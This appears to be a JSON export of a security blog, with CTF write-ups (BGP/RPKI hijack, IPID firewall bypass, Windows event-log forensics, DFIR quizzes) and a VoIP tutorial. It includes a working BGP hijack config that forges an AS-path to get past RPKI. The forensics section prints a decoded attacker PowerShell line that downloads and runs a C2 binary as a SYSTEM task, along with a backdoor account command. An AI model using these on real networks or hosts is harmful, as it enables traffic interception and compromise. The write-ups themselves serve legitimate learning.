[{"title":"D^3CTF 2025","url":"/2025/06/03/D^3CTF-2025/","content":"\nD^3CTF 2025!\nOrganized by @Vidar, @CNSS, @L-Team, the 6th D^3CTF.\n\nD^3 means \"the cube of Dian\", i.e., the cube of \"electronic\" in Chinese. As the three teams co-hosting this CTF game come from three \"University of Electronic\" in China (UESTC, Xidian, HDU).\n\nI participated in D^3CTF 2025, as a member of my institute's club, InfoSecIITR. This writeup details the challenge I attempted during the competition.\n\n## Misc-Networking\n\n### d3RPKI\n\n#### Challenge Description\n\nAfter 2 network challenges in D^3CTF 2024 and 2021, here comes the third one.\n\n在 D^3CTF 2024 and 2021 的两个网络题后，第三个网络题这就来了。\n\nIt's time to test your network skill by hacking our BGP network.\n\n是时候在我们的 BGP 网络中展现你的配网水平了。\n\nPlz connect with ssh, login as root and the passwd is also root.\n\n请使用 ssh 链接靶机，账户密码都是 root\n\nIt always takes at least 5 minutes to setup the environment, so it's recommended to use local environment first.\n\n靶机起码要开五分钟，别急，可以先试试本地\n\nAttachments: [src.zip](/images/posts/2025-d^3ctf/src.zip)\n\n#### Solution\n\nUnfortunately, I was only able to solve this challenge partially during the competition—I missed a minor but crucial step.\n\nThe challenge name mentions \"RPKI\" (Resource Public Key Infrastructure), which is used to secure BGP.\n\n**Network Topology**\n\n- t1 (AS 4211110001) - Main router at 10.1.0.1, acts as RPKI validator\n- t2-1 (AS 4211110002) - Router at 10.2.0.1 where we're currently located\n- t2-2 (AS 4211110003) - Router at 10.3.0.1, contains the flag and sends it to 10.4.0.5:1234\n- t2-3 (AS 4211110004) - Router at 10.4.0.1\n\n**Docker Compose (compose.yml)**\n\nSets up the network topology with:\n\n- Multiple networks using macvlan drivers for Layer 2 connectivity\n- Each container gets specific IP addresses on different subnets\n- NET_ADMIN capabilities for network manipulation\n- Port 2233 mapped to SSH on t2-1 for external access\n\n**BGP Routing (bird.conf files)**\n\nEach router runs BIRD (BGP daemon) configured to:\n\n- Establish BGP peering relationships between routers\n- Use ROA (Route Origin Authorization) validation via RPKI\n- Filter routes based on ROA validation to prevent route hijacking\n- Advertise static routes for their local subnets\n\n**RPKI/ROA System (roa_stayrtr.json)**\n\n- t1 runs StayRTR as an RPKI cache server\n- roa_stayrtr.json defines valid route origins for each AS\n- Other routers connect to t1's RPKI cache for route validation\n- Routes failing ROA validation are rejected\n\nThe challenge title and the provided files clearly indicate a BGP route hijacking attack that exploits a fundamental limitation in RPKI.\n\n**The RPKI Limitation**\n\nRPKI validates that a specific network prefix (like 10.4.0.0/24) is authorized to be announced by a particular AS (like AS 4211110004). However, *RPKI doesn't verify WHO is actually making the announcement* - it only checks if the announced prefix and AS number combination is valid.\n\n**The Attack Strategy**\n\nThe goal is to intercept the flag that t2-2 is sending to 10.4.0.5:1234. To do this, the attacker needs to:\n\n1. Hijack the IP 10.4.0.5 by making other routers believe traffic to that IP should come through the attacker\n2. Bypass RPKI validation by making the hijacked route appear legitimate\n\nUpon logging in via `SSH`, we’re provided with limited commands and already have access to the `BIRD` config files. We can use commands like `bird`, `birdc`, `nc`, etc.\n\nConfiguring bird.conf on t2-1\n\n```bash\n$ ssh root@35.241.98.126 -p 30921\nroot@b04002374330:~# vi /etc/bird/bird.conf\nroot@b04002374330:~# birdc configure\nBIRD 2.14 ready.\nReading configuration from /etc/bird/bird.conf\nReconfigured\nroot@b04002374330:~# cat /etc/bird/bird.conf\nlog syslog all;\ndebug protocols all;\n\nrouter id 10.2.0.1;\n\nipv4 table BGP_table;\n\nprotocol device{\n\n}\n\nprotocol kernel{\n    scan time 10;\n    ipv4 {\n        export all;\n        import none;\n    };\n}\n\nprotocol static {\n    ipv4 {\n        table BGP_table;\n        import all;\n        export none;\n    };\n\n    route 10.2.0.0/24 reject;\n    # Added this\n    route 10.4.0.5/32 reject;\n}\n\nroa4 table r4;\n\nprotocol rpki {\n        debug all;\n\n        roa4 { table r4; };\n\n        remote \"10.0.0.1\" port 8083;\n\n        retry keep 5;\n        refresh keep 30;\n        expire 600;\n}\n\ntemplate bgp BGP_peers {\n    ipv4 {\n        table BGP_table;\n        import filter{\n            # Added this\n            if net = 10.4.0.0/24 then reject;\n            if roa_check(r4, net, bgp_path.last) !~ [ROA_VALID] then {\n                print \"ROA check failed for \", net, \" ASN \", bgp_path.last;\n                reject;\n            }\n            accept;\n        };\n        export filter {\n            #Added this\n            if net = 10.4.0.5/32 then {\n                bgp_path.prepend(4211110004);\n            }\n            if source ~ [RTS_STATIC, RTS_BGP] then accept;\n            reject;\n        };\n    };\n}\n\nprotocol pipe {\n    table master4;\n    peer table BGP_table;\n    import filter {\n        if source = RTS_STATIC then reject;\n        krt_prefsrc = 10.2.0.1;\n        accept;\n    };\n    export none;\n}\n\nprotocol bgp t1 from BGP_peers {\n    local 10.0.0.2 as 4211110002;\n    neighbor 10.0.0.1 as 4211110001;\n}\n```\n\n1. Add a Static Route\n\n`route 10.4.0.5/32 reject;  # More specific route than the /24`\n\nThis creates a more specific route (/32 is more specific than /24) that will be preferred by BGP.\n\n2. Filter Incoming Routes\n\n`if net = 10.4.0.0/24 then reject;`\n\nBlock the legitimate route announcement for the entire 10.4.0.0/24 subnet.\n\n3. Forge the AS-PATH\n\n```\nif net = 10.4.0.5/32 then { \n    bgp_path.prepend(4211110004); \n}\n```\n\nWhen announcing the hijacked route, prepend AS 4211110004 to the AS-PATH. This makes it appear as if the route is legitimately coming from AS 4211110004.\n\nI missed Step 3 during the competition.  :(\n\n**Why This Works**\n\n- More Specific Route: The /32 route is more specific than any /24 route, so it will be preferred.\n\n- RPKI Validation Passes: Because the AS-PATH shows AS 4211110004 as the origin, and the ROA table says AS 4211110004 is authorized for 10.4.0.0/16, RPKI validation succeeds.\n\n- Traffic Redirection: Other routers will now send traffic destined for 10.4.0.5 to the attacker instead of the legitimate destination.\n\nFurther lookup for the IP 10.4.0.5:\n\n```bash\nroot@b04002374330:~# ip addr add 10.4.0.5/32 dev lo\nroot@b04002374330:~# birdc show route table master4\nBIRD 2.14 ready.\nTable master4:\n10.3.0.0/24          unicast [t1 12:56:29.380] * (100) [AS4211110003i]\n        via 10.0.0.1 on eth1\n10.1.0.0/24          unicast [t1 12:56:29.380] * (100) [AS4211110001i]\n        via 10.0.0.1 on eth1\nroot@b04002374330:~# birdc show route table BGP_table\nBIRD 2.14 ready.\nTable BGP_table:\n10.3.0.0/24          unicast [t1 12:56:29.380] * (100) [AS4211110003i]\n        via 10.0.0.1 on eth1\n10.1.0.0/24          unicast [t1 12:56:29.380] * (100) [AS4211110001i]\n        via 10.0.0.1 on eth1\n10.2.0.0/24          unreachable [static1 12:56:29.032] * (200)\n10.4.0.5/32          unreachable [static1 13:01:46.543] * (200)\nroot@b04002374330:~# birdc show protocols\nBIRD 2.14 ready.\nName       Proto      Table      State  Since         Info\ndevice1    Device     ---        up     12:56:29.032\nkernel1    Kernel     master4    up     12:56:29.032\nstatic1    Static     BGP_table  up     12:56:29.032\nrpki1      RPKI       ---        up     12:56:29.272  Established\npipe1      Pipe       ---        up     12:56:29.032  master4 <=> BGP_table\nt1         BGP        ---        up     12:56:29.350  Established\nroot@b04002374330:~# birdc show route\nBIRD 2.14 ready.\nTable master4:\n10.3.0.0/24          unicast [t1 12:56:29.380] * (100) [AS4211110003i]\n        via 10.0.0.1 on eth1\n10.1.0.0/24          unicast [t1 12:56:29.380] * (100) [AS4211110001i]\n        via 10.0.0.1 on eth1\n\nTable r4:\n10.3.0.0/16-32 AS4211110003  [rpki1 12:56:29.279] * (100)\n10.4.0.0/16-32 AS4211110004  [rpki1 12:56:29.279] * (100)\n10.1.0.0/16-32 AS4211110001  [rpki1 12:56:29.279] * (100)\n10.2.0.0/16-32 AS4211110002  [rpki1 12:56:29.279] * (100)\nroot@b04002374330:~# ip addr\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet 10.4.0.5/32 scope global lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host\n       valid_lft forever preferred_lft forever\n2: eth0@if12: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default\n    link/ether 32:fa:13:6b:1d:07 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n    inet 100.64.24.2/24 brd 100.64.24.255 scope global eth0\n       valid_lft forever preferred_lft forever\n21: eth1@if10: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default\n    link/ether 16:4b:07:36:c2:b8 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n    inet 10.0.0.2/24 brd 10.0.0.255 scope global eth1\n       valid_lft forever preferred_lft forever\n22: eth2@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default\n    link/ether 2a:07:3b:54:76:5e brd ff:ff:ff:ff:ff:ff link-netnsid 0\n    inet 10.2.0.1/24 brd 10.2.0.255 scope global eth2\n       valid_lft forever preferred_lft forever\n```\n\nThe route for 10.4.0.5/32 is now in place and reachable via our node.

Whether you're looking to experiment with VoIP tech, dive into packet-level analysis using Wireshark, or build challenges for cybersecurity CTFs, this post has you covered.\n\n\n### What is VoIP?\n\nVoIP (Voice over Internet Protocol) allows you to make voice and video calls over the internet instead of traditional phone lines. It converts analog voice signals into digital data that travels over IP networks.\n\nHere’s a simple diagram to show how it works:\n\n![Basic Workflow](/images/posts/2025-voip/what-is-VoIP-Phone-Diagram.jpg)\n\n![Image3](/images/posts/2025-voip/Introduction-to-VOIP-Phone.webp)\n\n### What You'll Need\n\nYou can either use two VMs or, like me, run one instance on Windows and another on a Linux VM (Ubuntu 24.04 on Oracle VirtualBox).\n\nRequired Tools:\n\n- Asterisk (v22.1.0) – Acts as your VoIP server\n\n- Linphone (v5.0.2) – A softphone for making calls\n\n### Setting Up Asterisk Server on Ubuntu\n\nOpen your terminal and run:\n\n```bash\nwget https://downloads.asterisk.org/pub/telephony/asterisk/asterisk-22.4.1.tar.gz | tar -zxvf asterisk-22.4.1.tar.gz\n```\n`\n>  I used `asterisk-22.1.0.tar.gz`, so update the version as needed.\n\n```bash\nsudo apt-get install build-essential libssl-dev libncurses5-dev libnewt-dev libxml2-dev libsqlite3-dev uuid-dev libedit-dev libjansson-dev sqlite3\n```\n\nNavigate to the Asterisk folder and enable SIP and RTP modules before building:\n\n```bash\nsudo make menuselect\n```\n\nEnable chan_pjsip and chan_rtp modules. Save and exit.\n\n![menuselect](/images/posts/2025-voip/menuselect.png)\n\nThen run the following commands one by one or by script:\n\n```bash\n./configure\nmake -j$(nproc)\nsudo make install\nsudo make samples\nsudo make config\n```\n\nThis will take some time. Be patient!\n\n### Configuring Asterisk\n\nEdit these files in /etc/asterisk/:\n\npjsip.conf – SIP user and transport configs\n\nextensions.conf – Dialplan logic\n\n`';' is for the comments`\n\npjsip.conf:\n\n```plaintext\n[101]\nauth=101 ; we are using username as 101\naors=101\ntype=endpoint\ncontext=internal\nmessage_context=internal\ntransport=udp_transport ; Mention the transport protocol you want to use\nlanguage=en\ndeny=0.0.0.0/0.0.0.0\npermit=192.168.0.0/24\ndisallow=all\nallow=h264,opus ; The protocols which you want to allow\nrtp_symmetric=yes\nforce_rport=yes\nrewrite_contact=yes ; If you want to rewrite existing contact then keep 'yes'\ndirect_media=no ; We are using softphone and we don't want users to share directly\noutbound_auth=101\ndtmf_mode=rfc4733 ; If you want to use the dial pad which uses DTMF protocol\ntos_audio=ef              ; Audio RTP\ntos_video=af41            ; Video RTP\ncos_audio=5               ; Audio RTP CoS\ncos_video=4               ; Video RTP CoS\nforce_avp=yes\nmedia_encryption=no\ncallerid=\"101\" <101>\n\n[101]\ntype=aor\nqualify_frequency=30\n;contact=sip:101@192.168.0.104:5060\nmax_contacts=1\nremove_existing=yes ;  If you want to rewrite existing contact then keep 'yes'\n\n[101]\ntype=auth\nauth_type=userpass\nusername=101\npassword=linphone_password1\n\n[102]\nauth=102 ; user as 102\naors=102\ntype=endpoint\ncontext=internal\nmessage_context=internal\ntransport=udp_transport\nlanguage=en\ndeny=0.0.0.0/0.0.0.0\npermit=192.168.0.0/24\ndisallow=all\nallow=h264,opus\nrtp_symmetric=yes\nforce_rport=yes\nrewrite_contact=yes\ndirect_media=no\noutbound_auth=102\ndtmf_mode=rfc4733\ntos_audio=ef              ; Audio RTP\ntos_video=af41            ; Video RTP\ncos_audio=5               ; Audio RTP CoS\ncos_video=4               ; Video RTP CoS\nforce_avp=yes\nmedia_encryption=no\ncallerid=\"102\" <102>\n\n[102]\ntype=aor\nqualify_frequency=30\n;contact=sip:102@192.168.0.104:5060\nmax_contacts=1\nremove_existing=yes\n\n[102]\ntype=auth\nauth_type=userpass\nusername=102\npassword=linphone_password2\n\n[udp_transport]\ntype=transport\nprotocol=udp\nbind=0.0.0.0:5060\nlocal_net=192.168.0.0/24\n;external_media_address=192.168.0.104 ; Replace with your Asterisk server's local IP\n;external_signaling_address=192.168.0.104 ; Replace with your Asterisk server's local IP\ntos=cs3                   ; SIP signaling\ncos=3                     ; SIP signaling CoS\n\nallow_reload=false\n```\n\nextensions.conf:\n\n```plaintext\n[internal]\n; Call handling for endpoints\nexten => 101,1,Dial(PJSIP/101,60)\nexten => 101,n,Hangup()\n\nexten => 102,1,Dial(PJSIP/102,60)\nexten => 102,n,Hangup()\n\n; Handle sending messages (plain text or file)\n; Extension 105 sends to 102\n\n; Handle sending messages (plain text)\nexten => 105,1,Verbose(1, \"Sending a message from 101 to 102\")\n\n same => n,Set(MESSAGE(body)=We will talk further on VoIP)\n\n ;same => n,Set(MESSAGE(body)=Hey X1E, I hope you're doing well.

possible keep the configuration same for both the Linphone.\n\nConfigure Linphone settings to match your SIP user and network setup. Here's how the user and network settings should look:\n\n![SIP User](/images/posts/2025-voip/sip_user.png)\n\n![Network](/images/posts/2025-voip/network.png)\n\nMostly similar with different port on Windows Linphone, Before starting the call make sure that SIP users and Asterisk server contains the same IP address.\n\nIf Ubuntu Linphone doesn’t connect automatically, use a static client first. You can temporarily comment out the contact= line in pjsip.conf to help establish the connection. Once connected, it’ll switch to dynamic mode automatically.\n\nYou'll know it worked when both Linphones show a green \"Online\" indicator.\n\n![avail screen](/images/posts/2025-voip/available.png)\n\n### Making the Call\n\nEstablish the Call from user 101 by dialing 102 from dial pad and you will get the call UI like this:\n\n![call](/images/posts/2025-voip/call.png)\n\nAfter making the call, you can set the `rtp debug on` which will show you rtp packets which help us to identify whether the call has been connected successfully or not as shown below:\n\n![rtp](/images/posts/2025-voip/rtp.png)\n\nSuccess! You're now sending voice over the network using Opus codec. For video calls, Linphone uses H.264.\n\nYou can also send messages by dialing different users like 105 or 106 (as defined in extensions.conf).\n\n### Deep Dive with Wireshark\n\nUse Wireshark to inspect:\n\n- SIP signaling\n\n- RTP media packets\n\n- Opus/H.264 streams\n\n- DTMF signals\n\nThis is where it gets exciting for CTF enthusiasts. Capture the VoIP traffic and create puzzles around:\n\n- Voice recovery\n\n- DTMF-based flag inputs\n\n- Hidden messages in SIP headers\n\nWant an example?\nCheck out my VoIP-based CTF challenge write-up [here](https://github.com/g4rud4kun/Challenges-Wu/blob/main/American%20Spy/README.md) where you can get to see the SIP, RTP, H.264, Opus, DTMF packets.\n\n### Conclusion\n\nSetting up VoIP might sound intimidating at first, but with Asterisk and Linphone, it's totally doable—even on a basic setup. Whether you're learning about network protocols, building CTF challenges, or just want to experiment with audio/video over IP—VoIP is a great playground.\n","tags":["networking","voip","wireshark"],"categories":["Blogs"]},{"title":"NahamCon CTF 2025","url":"/2025/05/28/NahamCon-CTF-2025/","content":"\nI participated in NahamCon CTF 2025, organized by JohnHammond, as a member of my institute's club, InfoSecIITR. This writeup details the challenge I solved during the competition.\n\n## Networking\n\n### A Special ID\n\n#### Challenge Description\n\n483 points - Networking - 60 Solves - hard\n\n`Author: @Kkevsterrr`\n\nWe've got a brand new, state of the art firewall here to protect our webserver.\nFor top of the line protection, only packets with specific IPIDs are allowed.\n\nNOTE: Accessing this challenge by the link below will time out. This connection refused is intentional. The challenge is not broken, and it is your task to understand how to connect to it. Port 8080 is the only port in scope for this challenge.\n\nConnect to this challenge at `http://137.184.230.90:8080`\n\n#### Solution\n\nAs mentioned in the description, only packets with specific IPIDs are allowed.\n\n```plaintext\nThe IPID (IP Identification field) is a 16-bit field in the IPv4 header, used to uniquely identify fragments of an original IP datagram. Here's what you need to know about its possible values in a raw packet:\n\nPossible Values for IPID\nRange: Since it's a 16-bit field, it can hold values from:\n0 to 65535 (0x0000 to 0xFFFF)\nSo any value between 0 and 65535 can legally appear as the IPID in a raw IPv4 packet.\n```\n\nTo exploit this, I began crafting packets using the Scapy Python library with different IPID values. Naturally, I started with 1337, a well-known number in cybersecurity culture. When I sent a SYN packet with IPID 1337, I received a SYN-ACK response with IPID 0.\n\nHowever, when I sent an ACK packet with an IPID other than 1337, the firewall dropped it. This indicated that only packets with IPID 1337 were permitted beyond the initial handshake.

This writeup details the challenge I solved during the competition.\n\n## Forensics\n\n### Wimdows 1\n\n#### Challenge Description\n\nEarlier this week, an attacker managed to get into one of our Windows servers... can you help us figure out what happened? The VM files for this challenge are located below (the credentials are vagrant/vagrant):\n\nhttps://byu.box.com/v/byuctf-wimdows\nWhat CVE did the attacker exploit to get a shell on the machine? Wrap your answer in byuctf{}. E.g. byuctf{CVE-2021-38759}\n\nHint: Figure out what process the attacker exploited and look up vulnerabilities associated with it.\n\nAuthor: deltabluejay\n\n#### Solution\n\nWe have provided a VM .ova file, which can be used with either VMware or Oracle VirtualBox. I chose VirtualBox, as I’m more comfortable with it, and they have also provided the VirtualBox Guest Additions file. This allows us to enlarge the screen and use features like copy-and-paste by loading and creating a new VM from the .ova file.\n\nAfter starting the VM, you’ll see a screen like this:\n\n![Initial VM View](/images/posts/2025-byuctf/vm_view.png)\n\nYou can log in using either the vagrant or Administrator account, both with the password vagrant. I first logged in as the vagrant user and noticed a goose roaming around the screen, as shown below:\n\n![Goose Desktop](/images/posts/2025-byuctf/goose.png)\n\nThen I switched to the Administrator user to gain superuser privileges if needed. I checked the PowerShell history but didn’t find anything, so I moved on to examine the Windows Event Logs. I found entries for System, Security, Application, Windows, Windows PowerShell, and more.\n\nI began analyzing the Windows PowerShell logs and came across the following log:\n\n![ElasticSearch](/images/posts/2025-byuctf/elastic.png)\n\nIt showed that Elasticsearch version 1.1.1 was being installed — a very old version. I also found several suspicious activities related to Elasticsearch in the Sysmon logs. This version likely has multiple CVEs, and one of them was an RCE (Remote Code Execution) vulnerability. We identified the relevant CVE.\n\n#### Flag\n\n```yaml\nbyuctf{CVE-2014-3120}\n```\n\n### Wimdows 2\n\n#### Challenge Description\n\nThis challenge uses the same files as for Wimdows 1.\n\nOnce they got in, the attacker ran some commands on the machine, but it looks like they tried to hide what they were doing. See if you can find anything interesting there (your answer will be found already in byuctf{} format).\nAuthor: deltabluejay\n\n#### Solution\n\nWhile searching through the Windows PowerShell logs, I found several Base64-encoded PowerShell commands, as shown below:\n\n![Wimdows2 Flag](/images/posts/2025-byuctf/wimdows2.png)\n\nThe decoded Base64 string is:\n\n```\nwrite-output 'byuctf{n0w_th4t5_s0m3_5u5_l00k1ng_p0w3rsh3ll_139123}'\n```\n\n#### Flag\n\n```yaml\nbyuctf{n0w_th4t5_s0m3_5u5_l00k1ng_p0w3rsh3ll_139123}\n```\n\n### Wimdows 3\n\n#### Challenge Description\n\nThis challenge uses the same files as for Wimdows 1.\n\nThe attacker also created a new account- what group did they add this account to? Wrap your answer in byuctf{}. E.g. byuctf{CTF Players}.\n\nReminder - all answers are case-INsensitive for all of these problems\nAuthor: deltabluejay\n\n#### Solution\n\nAs we had already observed the user accounts while logging in as Administrator, I decided to investigate further using PowerShell, as shown below:\n\n![Wimdows3 PwSh](/images/posts/2025-byuctf/pwsh.png)\n\nWhen I ran the command `$ net user`, I noticed an additional user named `phasma`. Upon further inspection, I found that phasma was the only account created recently in 2025, while the others were from 2022. Later, while reviewing the Windows PowerShell logs, I found confirmation via a PowerShell command that showed how the phasma user was created, as shown below:\n\n![Wimdows3 logs](/images/posts/2025-byuctf/phasma.png)\n\nThe decoded Base64 string: \n\n```\nnet user phasma f1rst0rd3r! /add\n```\n\nWe obtained the group from the terminal output.\n\n#### Flag\n\n```yaml\nbyuctf{Remote Desktop Users}\n```\n\n### Wimdows 4\n\n#### Challenge Description\n\nThis challenge uses the same files as for Wimdows 1.\n\nUsing their access, the attacker also deployed a C2 binary on the machine - what C2 framework was it, and what IP address was the C2 attempting to connect to?\n\nFormat your answer like so: byuctf{c2 framework_ip address}. E.g. byuctf{evilosx_10.1.1.1}\nAuthor: deltabluejay\n\n#### Solution\n\nI came across the following log, which caught my attention:\n\n![Update.exe log](/images/posts/2025-byuctf/update_log.png)\n\nThe decoded Base64 string: \n\n```Powershell\n$BINARY='C:\\Windows\\System32\\update.exe' ; $ProgressPreference = 'SilentlyContinue' ; Invoke-WebRequest -Uri \"http://192.168.1.107:8000/update.exe\" -OutFile $BINARY ; schtasks /create /tn \"updates\" /tr $BINARY /ru 'SYSTEM' /sc onstart /rl highest ; schtasks /run /tn \"updates\"\n```\n\nI proceeded to check the downloaded file (update.exe) and executed it, but it didn’t show any noticeable output. I then extracted the file on my host laptop, where Windows Defender immediately quarantined it. After that, I uploaded it to [VirusTotal](https://www.virustotal.com/gui/file/57baac9260834ea53ae47e09d76247a4c692dfbcec05aa4ed141773af7a4754c/), which returned the following result:\n\n![Sliver](/images/posts/2025-byuctf/sliver.png)\n\nIt revealed that the file was using the Sliver C2 Framework and was attempting to connect to the IP address 192.168.1.224 over TCP port 8888 `(IP Traffic: TCP 192.168.1.224:8888)`.\n\n#### Flag\n\n```yaml\nbyuctf{sliver_192.168.1.224}\n```\n\n### Wimdows 5\n\n#### Challenge Description\n\nThis challenge uses the same files as for Wimdows 1.\n\nLast but not least, the attacker put another backdoor in the machine to give themself SYSTEM privileges... what was it? (your answer will be found directly in byuctf{} format)\nAuthor: deltabluejay\n\n#### Solution\n\nAfter fully exploring the Windows PowerShell logs, I moved on to review other logs, and the Sysmon logs particularly caught my attention. I found one log entry that contained the flag directly in plain text, as shown below:\n\n![Sysmon Logs](/images/posts/2025-byuctf/sysmon.png)\n\n#### Flag\n\n```yaml\nbyuctf{00p5_4ll_b4ckd00r5_139874}\n```","tags":["forensics","VM","Winevt"],"categories":["CTF-Writeups"]},{"title":"Srdnlen CTF 2025","url":"/2025/01/21/Srdnlen-CTF-2025/","content":"\nI participated in Srdnlen CTF 2025, as a member of my institute's club, InfoSecIITR. This writeup details the challenges of the forensics category.\n\n## Misc-Forensics\n\n### DFIR 1 - Malvent\n\n#### Challenge Description\n\nWe have been notified of an attack in one of our machines. This is a real forensics investigation and you have to analyse the given evtx files and answer to the related questions. At the end you will get the flag when you answer everything correct.\n\nDfir 1 - Question 4: you have to find all the numbers separated by a comma related to insecure credential management (e.g., 1000, 2355, etc)\n\nNOTE: This is a real malware. Do not execute nothing. Pay attention and be careful. Srdnlen denies every damage on your infrastructure.\n\nThis is a remote challenge, you can connect to the service with: `nc dfir1.challs.srdnlen.it 1984`\n\nAuthor: slsanna\nAttachments: al_evtx.zip\n\n#### Solution\n\nWe received a series of DFIR Challenges from 1-4 and were provided with the al_evtx.zip file for the first challenge. To analyze these files, I used the Event Viewer tool.\n\nStep 1: Initial Connection and Question 1\n\nLet's start by running the nc instance:\n\n```bash\n$ nc dfir1.challs.srdnlen.it 1984\n\n##############################################\n#    Welcome to DFIR.1 Malvent Challenge!    #\n##############################################\n\nIn this challenge, you have to retrieve information from the given evtx files from al_evtx.zip\nYou will answer a series of questions.\nEach correct answer will take you closer to the flag srdnlen{something}\nGood luck!\n\nWhat is the name of the suspicious service installed?\n```\n\nFor this question, I started analyzing System logs. While checking the logs of the Source Service Control Manager, I noticed that a service with a random name had started, and the source of it was also a random filename, which seemed suspicious. This is shown below in the image:\n\n![Sus](/images/posts/2025-srdnlenctf/sus_service.png)\n\nI submitted the name and found that it was the correct one.\n\n```Text\nWhat is the name of the suspicious service installed?\nQcUcMElh\nCorrect!\nFrom which process it has been generated? Give also the extension\n```\n\nUsing the same image above, I could answer the questions in Step 2 & 3.\n\n```Text\nFrom which process it has been generated? Give also the extension\nlmIcgUEQ.exe\nCorrect!\nWhat is its event ID?\n7045\nCorrect!\nGive the events IDs corresponding to unsecured data (e.g. cryptography). If more than one put a comma (e.g. 1, 2)\n```\n\nStep 4: Finding Event IDs for Unsecured Data\n\nI think this question was unclear, and the hint released later on, mentioned in the description, made it even more confusing. Because of this, we were unable to solve it, and many others were just analyzing the Security logs like us. Some of them brute-forced and found the correct one. :(\n\nI got the answer to this question later from `warlocksmurf`. When analyzing the System logs, I came across the TPM Logs, which showed that the data could not be encrypted.\n\n![TPM](/images/posts/2025-srdnlenctf/unsecured_data.png)\n\nOne of the event IDs is 15, and while finding the second event ID, I realized that event ID 18 contains the message: \"This event triggers the Trusted Platform Module (TPM) provisioning/status check to run.\" With this, we get both event IDs.\n\nAfter this question, the rest were doable, and we could have completed this challenge during the competition.\n\n```Text\nGive the events IDs corresponding to unsecured data (e.g. cryptography). If more than one put a comma (e.g. 1, 2)\n15, 18\nCorrect!\nWhich event ID is related to the state of the account protection?\n```\n\nStep 5: Identifying the Event ID Related to Account Protection\n\nWhile analyzing the System logs, I came across Event ID 16977 from the Source Directory-Services-SAM, which referenced the password.\n\n```Text\nWhich event ID is related to the state of the account protection?\n16977\nCorrect!\nGive the compromised CLSID stating that malicious code could be executed. If more than one, put a comma (e.g. str1, str2)\n```\n\nStep 6: Finding Compromised CLSIDs\n\nFor this question, search for \"CLSID\" in the System logs using Find. You will find two strings, as shown below:\n\n![CLSID](/images/posts/2025-srdnlenctf/clsid.png)\n\n```Text\nGive the compromised CLSID stating that malicious code could be executed. If more than one, put a comma (e.g. str1, str2)\nWindows.SecurityCenter.SecurityAppBroker, Windows.SecurityCenter.WscBrokerManager\nCorrect!\nWhat is the port number listening for remote control?\n```\n\nStep 7: Determining the Port Number for Remote Control\n\nFor this question, I found RDP URLs in the System logs. I tried all the associated port numbers, and the correct one is shown below:\n\n![Remote](/images/posts/2025-srdnlenctf/rdp.png)\n\n```Text\nWhat is the port number listening for remote control?\n3387\nCorrect!\nGive the event ID related to the manipulation of specific data (e.g. registry key manipulation, deletion, creation, modification)\n```\n\nStep 8: Locating the Event ID for the Manipulation\n\nWhile analyzing the System logs, I found that Event ID 16 was associated with changes in Hives, which was the correct answer.\n\n```Text\nGive the event ID related to the manipulation of specific data (e.g. registry key manipulation, deletion, creation, modification)\n16\nCorrect!\nGive the application name whose corruption could depend from the malware. (First letter uppercase, add also the extension).\n```\n\nStep 9: Finding the Malware-Affected Application\n\nWhile analyzing the Application logs, I found an event with suspicious messages including Widgets.exe, which matched the question. This turned out to be the correct one.\n\n```Text\nGive the application name whose corruption could depend from the malware. (First letter uppercase, add also the extension).\nWidgets.exe\nCorrect!\nIs Windows Defender on?\n```\n\nStep 10: Checking Windows Defender Status\n\nFor this question, I found the result as shown below:\n\n![WinDef](/images/posts/2025-srdnlenctf/windef.png)\n\nWindows Defender was on.\n\n```Text\nIs Windows Defender on?\nYes\nCorrect!\nWhat is the event ID stating this?\n```\n\nStep 11: Identifying the Event ID Indicating Windows Defender Status\n\nFrom the same image, you can see that the Event ID was 15.\n\n```Text\nWhat is the event ID stating this?\n15\nCorrect!\nGive the event ID related to the wrong management of different sessions and users in remote desktop\n```\n\nStep 12: Finding Event ID for Remote Desktop Mismanagement\n\nYou can find the answer in the Application logs. The message states:\n\"The winlogon notification subscriber <SessionEnv> was unavailable to handle a critical notification event.\"\nThe event ID is 6003.\n\n```Text\nGive the event ID related to the wrong management of different sessions and users in remote desktop\n6003\nCorrect!\nWhich event ID states that the malware could have read the credentials?\n```\n\nStep 13: Locating the Event ID for Credential Access\n\nI had memorized this Event ID earlier while analyzing the Security logs so much.\n\n```Text\nWhich event ID states that the malware could have read the credentials?\n5379\nCorrect!\nCongratulations!

This is a real forensics investigation and you have to analyse the given pcap file and answer to the related questions. At the end you will get the flag when you answer everything correct.\n\nNOTE: This is a real malware. Do not execute nothing. Pay attention and be careful. Srdnlen denies every damage on your infrastructure.\n\nThis is a remote challenge, you can connect to the service with: `nc dfir2.challs.srdnlen.it 1985`\nAuthor: slsanna\n\nAttachments: capture_net.pcapng\n\n#### Solution\n\nI'd blooded this challenge :P. We were provided with a PCAPNG file and an nc interface to answer a series of questions. Let’s begin!\n\nStep 1: Initial Connection and Question 1\n\nI started by connecting to the challenge service to check the first question:\n\n```bash\n$ nc dfir2.challs.srdnlen.it 1985\n\n##############################################\n#    Welcome to DFIR.2 MalNet Challenge!     #\n##############################################\n\nIn this challenge, you have to retrieve information from the given pcap capture_net.pcap \nYou will answer a series of questions.\nEach correct answer will take you closer to the flag srdnlen{something}\nGood luck!\n\nWhich packet contains the header of an executable file?\n\n```\nUsing Wireshark, I exported all objects (File -> Export Objects) and identified the relevant files:\n\n![Export Objects](/images/posts/2025-srdnlenctf/exp_obj.png)\n\nHere's a snippet of the file types identified using the file command:\n\n```bash\n$ file *\n7d9cd93c-1d5e-449b-9ad7-f1e8d6b90509%3fP1=1736543287&P2=404&P3=2&P4=A4bbVZMC2rLzoHuEoqkGyn%2bfjFNZYtKNVXsPbIbY5Amz3v4r%2bQitB5Uc%2fXCKOEvShr8HAJPOsSVdpx2t0DGgKQ%3d%3d(19):  